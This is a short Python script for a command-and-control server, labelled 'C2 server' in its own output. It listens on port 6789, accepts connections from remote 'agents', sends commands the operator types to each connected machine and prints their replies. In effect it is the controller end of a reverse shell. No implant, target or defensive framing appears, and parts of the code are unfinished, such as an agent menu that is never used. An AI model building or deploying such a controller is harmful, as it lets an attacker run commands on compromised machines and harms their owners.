import socket
import threading
import sys

thread_index = []

def start_server(host='', port=6789):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((host, port))
        server_socket.listen(5)
        print(f"Listening at {host}:{port}\nWaiting for incoming connections.")
        while True:
            client_socket, addr = server_socket.accept()
            print(f"Accepted connection from {addr}\nUse '!close' to close the connection\nUse '!exit' to terminate the C2 server\n")
            handle_client(client_socket, addr)
    except KeyboardInterrupt:
        print("\n\nServer shutting down...")
    finally:
        server_socket.close()
        print("Server terminated.\n")
        sys.exit(0)

def menu():
    print("""--- Agents connected ---""")
    for entry in thread_index:
        if len(thread_index) > 0:
            print(entry)
        else:
            print("No connections received.")

def handle_client(client_socket, addr):
    try:
        while True:
            prompt = input('>>> ')
            if prompt == '!exit':
                print("\nTerminating server...")
                client_socket.close() 
                raise KeyboardInterrupt
            if prompt == '!close':
                client_socket.close()
            client_socket.send(f"{prompt}".encode('utf-8'))
            message = client_socket.recv(4096).decode('utf-8')
            if message:
                print(f"{message}")
            else:
                break
    except Exception as e:
        print(f"Connection closed from {addr}\n")
    finally:
        client_socket.close()
        exit

if __name__ == "__main__":
    start_server()

